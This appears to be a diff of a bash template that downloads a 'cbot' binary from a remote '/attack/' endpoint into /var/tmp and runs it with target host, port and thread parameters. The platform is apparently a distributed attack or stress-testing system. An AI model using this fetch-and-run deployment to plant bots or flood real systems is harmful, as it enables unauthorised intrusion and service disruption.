@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 
-download_cbot_uri="http://{{.RHost}}:{{.FPort}}/attack/cbot/cbot_linux"
+download_cbot_uri="http://{{.RHost}}:{{.FPort}}/attack/tasks/{{.TaskId}}/cbot_linux"
+pnodeId=$1
 
 function download() {
 
@@ -29,7 +30,7 @@ function download() {
 function run_cbot() {
 
     chmod a+x /var/tmp/cbot
-    /var/tmp/cbot -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
+    /var/tmp/cbot -pnode $pnodeId -taskId {{.TaskId}} -rhost {{.RHost}} -rport {{.RPort}} -fport {{.FPort}} -threads {{.Threads}} -scap {{.Scap}} -acap {{.Acap}}
 }
 
 download
